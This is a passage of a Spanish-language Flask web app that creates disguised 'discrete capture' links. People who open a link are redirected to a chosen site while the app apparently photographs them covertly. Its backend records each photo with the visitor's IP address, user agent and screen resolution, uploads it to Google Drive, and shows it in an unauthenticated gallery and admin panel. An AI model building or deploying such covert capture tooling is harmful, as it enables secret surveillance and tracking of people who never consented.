        .no-photos { text-align: center; font-size: 1.2rem; color: #777; padding: 50px; }
        .actions { margin-top: 15px; text-align: right; }
        .actions button { background: #dc3545; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-size: 0.9rem; transition: background 0.2s; }
        .actions button:hover { background: #c82333; }
    </style>
</head>
<body>
    <div class="container">
        <a href="/" class="back-link">← Volver a la página principal</a>
        <h1>📸 Galería de Fotos Capturadas</h1>
        
        {% if photos %}
            <div class="gallery-grid">
                {% for photo in photos %}
                    <div class="photo-card">
                        {# Prioriza la URL de Google Drive si está disponible #}
                        {% if photo.drive_info and photo.drive_info.view_link %}
                            <img src="{{ photo.drive_info.view_link }}" alt="Foto Capturada (Drive)">
                        {# Si no hay Drive Link, intenta con la ruta local (solo en desarrollo) #}
                        {% elif photo.local_path %}
                            <img src="/view_photo/{{ photo.filename }}" alt="Foto Capturada (Local)">
                        {# Si no hay ninguna, muestra un placeholder #}
                        {% else %}
                            <img src="https://via.placeholder.com/280x200?text=Imagen+no+disponible" alt="Imagen no disponible">
                        {% endif %}
                        <div class="photo-info">
                            <h3>Link ID: {{ photo.link.id if photo.link else photo.link_id }}</h3>
                            <p><strong>Destino:</strong> <a href="{{ photo.destination_url }}" target="_blank">{{ photo.destination_url.split('/')[2]|default('URL') }}</a></p>
                            <p><strong>Captura:</strong> {{ photo.timestamp.strftime('%Y-%m-%d %H:%M:%S') }}</p>
                            <p><strong>IP:</strong> {{ photo.ip_address }}</p>
                            <p><strong>Resolución:</strong> {{ photo.screen_resolution }}</p>
                            {% if photo.drive_config_used %}
                                <p><strong>Config. Drive:</strong> {{ photo.drive_config_used.id }}</p>
                            {% else %}
                                <p><strong>Config. Drive:</strong> N/A</p>
                            {% endif %}
                            {% if photo.drive_info and photo.drive_info.view_link %}
                                <p><strong>Drive:</strong> <a href="{{ photo.drive_info.view_link }}" target="_blank">Ver en Drive</a></p>
                            {% elif photo.drive_info and photo.drive_info.error %}
                                <p><strong>Drive:</strong> Error ({{ photo.drive_info.error }})</p>
                            {% else %}
                                <p><strong>Drive:</strong> No subida</p>
                            {% endif %}
                            <p><strong>User Agent:</strong> <small>{{ photo.user_agent[:80] }}{% if photo.user_agent|length > 80 %}...{% endif %}</small></p>
                            <div class="actions">
                                <button onclick="deletePhoto('{{ photo.id }}')">Eliminar</button>
                            </div>
                        </div>
                    </div>
                {% endfor %}
            {% else %}
                <p class="no-photos">Aún no hay fotos capturadas. ¡Genera un link y pruébalo!</p>
            {% endif %}
        </div>

        <script>
            async function deletePhoto(photoId) {
                if (!confirm('¿Estás seguro de que quieres eliminar esta foto? Se eliminará de la base de datos y de Google Drive (si existe).')) {
                    return;
                }
                try {
                    const response = await fetch('/delete_photo/' + photoId, {
                        method: 'POST'
                    });
                    const data = await response.json();
                    if (data.success) {
                        alert('Foto eliminada.');
                        location.reload(); 
                    } else {
                        alert('Error al eliminar: ' + data.error);
                    }
                } catch (error) {
                    console.error('Error:', error);
                    alert('Error de red al intentar eliminar la foto.');
                }
            }
        </script>
    </body>
    </html>
    """

ADMIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📊 Panel de Administración</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; color: #333; }
        .container { max-width: 1000px; margin: 0 auto; background: white; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.08); padding: 40px; }
        h1 { text-align: center; color: #667eea; margin-bottom: 40px; font-size: 2.5rem; }
        .back-link { display: block; text-align: center; margin-bottom: 30px; text-decoration: none; color: #17a2b8; font-weight: 600; font-size: 1.1rem; }
        .link-card { background: #f8f9fa; border: 1px solid #e1e5e9; border-radius: 10px; padding: 20px; margin-bottom: 20px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
        .link-card h3 { margin-top: 0; margin-bottom: 10px; font-size: 1.5rem; color: #444; }
        .link-card p { margin-bottom: 5px; font-size: 1rem; color: #666; }
        .link-card a { color: #667eea; text-decoration: none; word-break: break-all; }
        .link-card a:hover { text-decoration: underline; }
        .link-card .stats { margin-top: 15px; padding-top: 15px; border-top: 1px solid #eee; display: flex; justify-content: space-between; flex-wrap: wrap; font-size: 0.95rem; color: #555; }
        .link-card .stat-item { margin-right: 15px; margin-bottom: 5px;}
        .link-card .stat-item strong { color: #333; }
        .no-links { text-align: center; font-size: 1.2rem; color: #777; padding: 50px; }
        .actions { margin-top: 15px; }
        .actions button { 
            background: #dc3545; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-size: 0.9rem; transition: background 0.2s; margin-right: 10px;
        }
        .actions button:hover { background: #c82333; }
        .actions .copy-btn { background: #007bff; }
        .actions .copy-btn:hover { background: #0056b3; }
        .actions .test-btn { background: #fd7e14; }
        .actions .test-btn:hover { background: #e96505; }
    </style>
</head>
<body>
    <div class="container">
        <a href="/" class="back-link">← Volver a la página principal</a>
        <h1>📊 Panel de Administración</h1>
        
        {% if sorted_links %}
            {% for link in sorted_links %}
                <div class="link-card">
                    <h3>{{ link.name }} (ID: {{ link.id }})</h3>
                    <p><strong>Destino:</strong> <a href="{{ link.destination_url }}" target="_blank">{{ link.destination_url }}</a></p>
                    <p><strong>Link de captura:</strong> <a id="captureLink-{{ link.id }}" href="{{ request.url_root.rstrip('/') }}/p/{{ link.id }}" target="_blank">{{ request.url_root.rstrip('/') }}/p/{{ link.id }}</a></p>
                    <div class="stats">
                        <span class="stat-item"><strong>Creación:</strong> {{ link.created_at.strftime('%Y-%m-%d') }}</span>
                        <span class="stat-item"><strong>Clicks:</strong> {{ link.clicks }}</span>
                        <span class="stat-item"><strong>Fotos capturadas:</strong> {{ link.photos_captured }}</span>
                        <span class="stat-item"><strong>Config. Drive:</strong> {{ link.drive_config.id if link.drive_config else 'N/A' }}</span>
                        {% if link.last_clicked_at %}
                            <span class="stat-item"><strong>Último click:</strong> {{ link.last_clicked_at.strftime('%Y-%m-%d %H:%M:%S') }}</span>
                        {% endif %}
                    </div>
                    <div class="actions">
                        <button class="copy-btn" onclick="copyLink('captureLink-{{ link.id }}')">Copiar Link</button>
                        <button class="test-btn" onclick="testLink('captureLink-{{ link.id }}')">Probar Link</button>
                        <button onclick="deleteLink('{{ link.id }}')">Eliminar Link</button>
                    </div>
                </div>
            {% endfor %}
        {% else %}
            <p class="no-links">Aún no hay links creados. ¡Genera uno!</p>
        {% endif %}
    </div>

    <script>
        async function copyLink(elementId) {
            const linkElement = document.getElementById(elementId);
            if (linkElement) {
                const textToCopy = linkElement.textContent;
                try {
                    await navigator.clipboard.writeText(textToCopy);
                    const btn = event.target;
                    const originalText = btn.textContent;
                    btn.textContent = '✅ Copiado';
                    setTimeout(() => { btn.textContent = originalText; }, 2000);
                } catch (err) {
                    alert('No se pudo copiar el link.');
                    console.error('Failed to copy: ', err);
                }
            }
        }

        function testLink(elementId) {
            const linkElement = document.getElementById(elementId);
            if (linkElement) {
                window.open(linkElement.href, '_blank');
            }
        }

        async function deleteLink(linkId) {
            if (!confirm('¿Estás seguro de que quieres eliminar este link? Las fotos asociadas NO se eliminarán automáticamente desde aquí. Tendrás que eliminarlas desde la galería.')) {
                return;
            }
            try {
                const response = await fetch('/delete_link/' + linkId, {
                    method: 'POST'
                });
                const data = await response.json();
                if (data.success) {
                    alert('Link eliminado.');
                    location.reload(); 
                } else {
                    alert('Error al eliminar: ' + data.error);
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Error de red al intentar eliminar el link.');
                
            }
        }
    </script>
</body>
</html>
"""

# ==================== FLASK ROUTES ====================

@app.route('/')
def index():
    """Página principal"""
    drive_configs = DriveConfig.query.all()
    return render_template_string(HOME_TEMPLATE, drive_configs=drive_configs)

@app.route('/config_drive')
def config_drive():
    """Página para configurar credenciales de Google Drive."""
    drive_configs = DriveConfig.query.all()
    return render_template_string(DRIVE_CONFIG_TEMPLATE, drive_configs=drive_configs)

@app.route('/save_drive_config', methods=['POST'])
def save_drive_config():
    """Guardar una nueva configuración de Google Drive."""
    try:
        data = request.get_json()
        config_name = data.get('config_name', '').strip()
        service_account_json = data.get('service_account_json')
        folder_id = data.get('folder_id', '').strip()

        if not config_name or not service_account_json or not folder_id:
            return jsonify({'success': False, 'error': 'Todos los campos son requeridos.'}), 400
        
        if not isinstance(service_account_json, dict):
            return jsonify({'success': False, 'error': 'El JSON de la cuenta de servicio no es un objeto válido.'}), 400

        existing_config = DriveConfig.query.get(config_name)
        if existing_config:
            return jsonify({'success': False, 'error': f'Ya existe una configuración con el nombre "{config_name}". Por favor, usa otro nombre.'}), 400

        new_config = DriveConfig(
            id=config_name,
            service_account_json=service_account_json,
            folder_id=folder_id
        )
        db.session.add(new_config)
        db.session.commit()
        logger.info(f"Configuración de Drive guardada: {config_name}")
        return jsonify({'success': True, 'message': 'Configuración de Drive guardada con éxito.'})
    except Exception as e:
        logger.error(f"Error al guardar configuración de Drive: {str(e)}", exc_info=True)
        return jsonify({'success': False, 'error': f'Error interno del servidor: {str(e)}'}), 500

@app.route('/delete_drive_config/<config_name>', methods=['POST'])
def delete_drive_config(config_name):
    """Eliminar una configuración de Google Drive."""
    try:
        config_to_delete = DriveConfig.query.get(config_name)
        if config_to_delete:
            db.session.delete(config_to_delete)
            db.session.commit()
            logger.info(f"Configuración de Drive eliminada: {config_name}")
            return jsonify({'success': True, 'message': 'Configuración de Drive eliminada con éxito.'})
        else:
            return jsonify({'success': False, 'error': 'Configuración no encontrada.'}), 404
    except Exception as e:
        logger.error(f"Error al eliminar configuración de Drive '{config_name}': {str(e)}", exc_info=True)
        return jsonify({'success': False, 'error': f'Error interno del servidor: {str(e)}'}), 500


@app.route('/create_photo_link', methods=['POST'])
def create_photo_link():
    """Crear nuevo link con captura de foto"""
    try:
        data = request.get_json()
        destination_url = data.get('destination_url')
        link_name = data.get('link_name', 'Link sin nombre')
        drive_config_id = data.get('drive_config_id') 

        if not destination_url:
            return jsonify({'success': False, 'error': 'URL de destino requerida'}), 400
        
        if not (destination_url.startswith('http://') or destination_url.startswith('https://')):
            return jsonify({'success': False, 'error': 'URL inválida. Debe comenzar con http:// o https://'}), 400
        
        if drive_config_id:
            config = DriveConfig.query.get(drive_config_id)
            if not config:
                return jsonify({'success': False, 'error': f'La configuración de Drive "{drive_config_id}" no existe.'}), 400

        link_id = str(uuid.uuid4())[:8] 
        
        new_link = Link(
            id=link_id,
            name=link_name,
            destination_url=destination_url,
            drive_config_id=drive_config_id 
        )
        db.session.add(new_link)
        db.session.commit()
        
        base_url = request.url_root.rstrip('/') 
        photo_link = f"{base_url}/p/{link_id}"
        
        logger.info(f"Link con foto creado: ID={link_id}, Destino={destination_url}, Config Drive: {drive_config_id if drive_config_id else 'N/A'}")
        
        return jsonify({
            'success': True,
            'link_id': link_id,
            'photo_link': photo_link,
            'destination_url': destination_url,
            'link_name': link_name,
            'message': 'Link con captura discreta creado'
        })
        
    except Exception as e:
        db.session.rollback() 
        logger.error(f"Error creando photo link: {str(e)}", exc_info=True)
        return jsonify({'success': False, 'error': f'Internal server error: {str(e)}'}), 500

@app.route('/p/<link_id>')
def photo_capture(link_id):
    """Página de captura discreta"""
    try:
        link_data = Link.query.get(link_id)
        
        if not link_data:
            logger.warning(f"Intento de acceso a link no encontrado: {link_id}")
            return "Link no encontrado. Puede haber sido eliminado o ser inválido.", 404
        
        destination_url = link_data.destination_url
        
        logger.info(f"Iniciando captura discreta para link ID: {link_id}, Destino: {destination_url}")
        
        encoded_destination_url = quote(destination_url, safe='')
        
        return render_template_string(DISCRETE_CAPTURE_TEMPLATE, 
                                    destination_url=encoded_destination_url,
                                    link_id=link_id)
        
    except Exception as e:
        logger.error(f"Error en photo_capture para link ID {link_id}: {str(e)}", exc_info=True)
        return f"Error interno del servidor al procesar el link: {str(e)}", 500

@app.route('/save_discrete_photo', methods=['POST'])
def save_discrete_photo():
    """Guardar foto capturada de forma discreta"""
    try:
        if 'photo' not in request.files:
            logger.warning("No photo file received in save_discrete_photo request.")
            return jsonify({'success': False, 'error': 'No photo file provided'}), 400
        
        file_obj = request.files['photo']
        link_id = request.form.get('link_id')
        
        if not link_id:
            logger.warning("No link ID received in save_discrete_photo request.")
            return jsonify({'success': False, 'error': 'No link ID provided'}), 400
        
        link_data = Link.query.get(link_id)
        
        if not link_data:
            logger.error(f"Link ID '{link_id}' not found for photo saving.")
            return jsonify({'success': False, 'error': 'Associated link not found'}), 404
        
        drive_config_id = link_data.drive_config_id
        drive_service = None
        drive_folder_id = None
        current_drive_info = {} 

        if drive_config_id:
            selected_config = DriveConfig.query.get(drive_config_id)
            if selected_config and GOOGLE_DRIVE_AVAILABLE:
                try:
                    drive_service = get_drive_service(selected_config.service_account_json)
                    drive_folder_id = selected_config.folder_id
                    if not drive_service:
                        logger.error(f"Failed to obtain Google Drive service for config: {drive_config_id}")
                        current_drive_info = {'error': 'No se pudo autenticar con Drive.', 'status': 'failed'}
                except Exception as e:
                    logger.error(f"Error loading/authenticating Drive config '{drive_config_id}': {e}", exc_info=True)
                    current_drive_info = {'error': f'Error en credenciales Drive: {str(e)}', 'status': 'failed'}
            else:
                logger.warning(f"Google Drive config '{drive_config_id}' not found or libraries not available.")
                current_drive_info = {'error': 'Configuración de Drive no encontrada o librerías no disponibles.', 'status': 'skipped'}
        else:
            logger.info(f"No Google Drive config selected for link '{link_id}'.")
            current_drive_info = {'error': 'No se seleccionó configuración de Drive.', 'status': 'skipped'}
        
        timestamp_dt = datetime.utcnow()
        user_agent = request.form.get('user_agent', request.headers.get('User-Agent', 'unknown'))
        screen_resolution = request.form.get('screen_resolution', 'unknown')
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        destination_url_from_form = request.headers.get('X-Destination', link_data.destination_url) 
        
        # Generar nombre de archivo único para la subida a Drive
        timestamp_for_filename = timestamp_dt.strftime('%Y%m%d_%H%M%S')
        unique_id = str(uuid.uuid4())[:8]
        original_file_part = file_obj.filename if file_obj.filename else 'photo.jpg'
        sanitized_filename_part = re.sub(r'[^\w\.-]', '_', original_file_part)
        filename = f"discrete_{timestamp_for_filename}_{unique_id}_{link_id}_{sanitized_filename_part}"

        local_filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        
        # Guardar foto localmente
        file_obj.save(local_filepath)
        logger.info(f"Foto guardada localmente: {local_filepath}")

        # Subir a Google Drive si el servicio y la ID de la carpeta están listos
        if drive_service and drive_folder_id:
            try:
                with open(local_filepath, 'rb') as f:
                    file_data_for_drive = f.read()
                current_drive_info = upload_to_drive(file_data_for_drive, filename, drive_folder_id, drive_service)
                logger.info(f"Foto '{filename}' subida a Google Drive. ID: {current_drive_info.get('drive_id')}")
            except Exception as e:
                logger.error(f"Error uploading photo '{filename}' to Google Drive: {e}")
                current_drive_info = {'error': str(e), 'status': 'failed'}
        else:
            logger.warning(f"Google Drive upload skipped for '{filename}' due to missing service or folder ID.")
        
        # En entorno de desarrollo local, no borramos el archivo local
        # En Render (producción), el almacenamiento es efímero, así que se borrará de todos modos.
        if not IS_LOCAL_DEV and os.path.exists(local_filepath):
            os.remove(local_filepath)
            logger.info(f"Archivo local temporal '{local_filepath}' eliminado.")

        # Guardar metadatos de la foto en la base de datos
        new_photo = Photo(
            link_id=link_id,
            filename=filename,
            local_path=local_filepath if IS_LOCAL_DEV else None, # Guarda la ruta local solo si es desarrollo local
            timestamp=timestamp_dt,
            ip_address=ip_address,
            user_agent=user_agent,
            screen_resolution=screen_resolution,
            destination_url=destination_url_from_form,
            drive_config_id=drive_config_id,
            drive_info=current_drive_info
        )
        db.session.add(new_photo)
        
        # Actualizar estadísticas del link
        link_data.clicks += 1
        link_data.photos_captured += 1
        link_data.last_clicked_at = timestamp_dt
        
        db.session.commit()
        logger.info(f"Estadísticas actualizadas para link '{link_id}'. Clicks: {link_data.clicks}, Fotos: {link_data.photos_captured}")
        
        return jsonify({
            'success': True,
            'message': 'Photo saved and processed successfully',
            'filename': filename,
            'local_path': local_filepath if IS_LOCAL_DEV else None, # Devolver la ruta local solo en desarrollo
            'drive_info': current_drive_info,
            'photo_id': new_photo.id
        })
        
    except Exception as e:
        db.session.rollback() 
        logger.error(f"Error saving discrete photo: {str(e)}", exc_info=True)
        return jsonify({'success': False, 'error': f'Internal server error: {str(e)}'}), 500

@app.route('/gallery')
def gallery():
    """Página para ver fotos capturadas."""
    photos = Photo.query.order_by(Photo.timestamp.desc()).all()
    return render_template_string(GALLERY_TEMPLATE, photos=photos)

@app.route('/view_photo/<filename>')
def view_photo(filename):
    """
    Ruta para servir fotos capturadas localmente.
    NOTA: En un despliegue en la nube como Render, el sistema de archivos es efímero.
    Las fotos guardadas localmente se eliminan con frecuencia o no persisten.
    Esta ruta SÓLO funcionará si el archivo existe en el sistema de archivos
    (principalmente en desarrollo local).
    La forma principal de ver la foto en producción será a través del enlace a Google Drive.
    """
    if not IS_LOCAL_DEV:
        logger.warning(f"Attempted to serve local file '{filename}' in production environment. This is not supported.")
        return "Acceso a archivo local no permitido en este entorno.", 403

    try:
        return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
    except FileNotFoundError:
        logger.warning(f"File not found when trying to serve: {filename}. It might have been deleted or never stored locally.")
        return "Foto no encontrada localmente. Revisa Google Drive.", 404
    except Exception as e:
        logger.error(f"Error serving photo '{filename}': {e}", exc_info=True)
        return "Error interno al servir la foto", 500


@app.route('/delete_photo/<photo_id>', methods=['POST'])
def delete_photo(photo_id):
    """Eliminar una foto y sus metadatos."""
    try:
        photo_to_delete = Photo.query.get(photo_id)

        if not photo_to_delete:
            logger.warning(f"Attempted to delete non-existent photo ID: {photo_id}")
            return jsonify({'success': False, 'error': 'Photo not found'}), 404

        # Eliminar de Google Drive (si existe y fue subida)
        drive_info = photo_to_delete.drive_info
        drive_config = photo_to_delete.drive_config_used 

        if drive_info and drive_info.get('drive_id') and GOOGLE_DRIVE_AVAILABLE and drive_config:
            try:
                service = get_drive_service(drive_config.service_account_json)
                if service:
                    service.files().delete(fileId=drive_info['drive_id']).execute()
                    logger.info(f"Deleted photo from Google Drive: {drive_info['drive_id']} using config '{drive_config.id}'")
                else:
                    logger.warning(f"Could not get Google Drive service for deletion of photo ID: {photo_id} (Config: {drive_config.id}).")
            except Exception as e:
                logger.error(f"Error deleting photo from Google Drive ID {drive_info['drive_id']} (Photo ID: {photo_id}): {e}", exc_info=True)
        else:
            logger.info(f"Skipped Google Drive deletion for photo ID {photo_id}. Drive info: {drive_info}, Config: {drive_config.id if drive_config else 'N/A'}, Available: {GOOGLE_DRIVE_AVAILABLE}")
        
        # Eliminar archivo localmente si existe y estamos en desarrollo local
        if IS_LOCAL_DEV and photo_to_delete.local_path and os.path.exists(photo_to_delete.local_path):
            os.remove(photo_to_delete.local_path)
            logger.info(f"Archivo local '{photo_to_delete.local_path}' eliminado.")

        # Eliminar de la base de datos
        db.session.delete(photo_to_delete)
        db.session.commit()
        logger.info(f"Photo metadata deleted from DB for ID: {photo_id}")

        return jsonify({'success': True, 'message': 'Photo deleted successfully'})

    except Exception as e:
        db.session.rollback()
        logger.error(f"Error deleting photo (ID: {photo_id}): {str(e)}", exc_info=True)
        return jsonify({'success': False, 'error': f'Internal server error: {str(e)}'}), 500


@app.route('/admin')
def admin_panel():
    """Panel de Administración para ver links y estadísticas."""
    links = Link.query.order_by(Link.created_at.desc()).all()
    return render_template_string(ADMIN_TEMPLATE, sorted_links=links, request=request)

@app.route('/delete_link/<link_id>', methods=['POST'])
def delete_link(link_id):
    """Eliminar un link."""
    try:
        link_to_delete = Link.query.get(link_id)
        if link_to_delete:
            # === PASO CRÍTICO: Eliminar fotos de Google Drive antes de eliminar el Link ===
            # Esto es necesario porque el cascade de SQLAlchemy solo elimina de la DB, no de Drive.
            # Se itera sobre link_to_delete.photos (la relación 'photos' en Link)
            for photo in link_to_delete.photos: # 'photos' es el nombre del backref desde Photo.link
                drive_info = photo.drive_info
                drive_config = photo.drive_config_used
                
                if drive_info and drive_info.get('drive_id') and GOOGLE_DRIVE_AVAILABLE and drive_config:
                    try:
                        service = get_drive_service(drive_config.service_account_json)
                        if service:
                            service.files().delete(fileId=drive_info['drive_id']).execute()
                            logger.info(f"Deleted photo from Google Drive: {drive_info['drive_id']} (linked to deleted Link {link_id})")
                    except Exception as e:
                        logger.error(f"Error deleting photo {photo.id} from Google Drive during link deletion: {e}", exc_info=True)

            # Eliminar el Link de la base de datos.
            # El 'cascade="all, delete-orphan"' en la relación Link.photos
            # se encargará de eliminar automáticamente las fotos asociadas de la DB.
            db.session.delete(link_to_delete)
            db.session.commit()
            logger.info(f"Link '{link_id}' y sus fotos asociadas (de la DB y Drive si subidas) eliminados.")
            return jsonify({'success': True, 'message': 'Link y fotos asociadas eliminados con éxito.'})
        else:
            logger.warning(f"Attempted to delete non-existent link ID: {link_id}")
            return jsonify({'success': False, 'error': 'Link not found'}), 404
    except Exception as e:
        db.session.rollback()
        logger.error(f"Error deleting link '{link_id}': {str(e)}", exc_info=True)
        return jsonify({'success': False, 'error': f'Internal server error: {str(e)}'}), 500

@app.route('/init_db')
def init_db():
    """Ruta para inicializar la base de datos (crear tablas). Útil para el primer despliegue."""
    try:
        with app.app_context(): 
            db.create_all()
        logger.info("Base de datos inicializada (tablas creadas).")
        return "Base de datos inicializada (tablas creadas).", 200
    except Exception as e:
        logger.error(f"Error al inicializar la base de datos: {e}", exc_info=True)
        return f"Error al inicializar la base de datos: {e}", 500


if __name__ == '__main__':
    with app.app_context():
        db.create_all() 
    app.run(debug=True, host='0.0.0.0', port=5000)
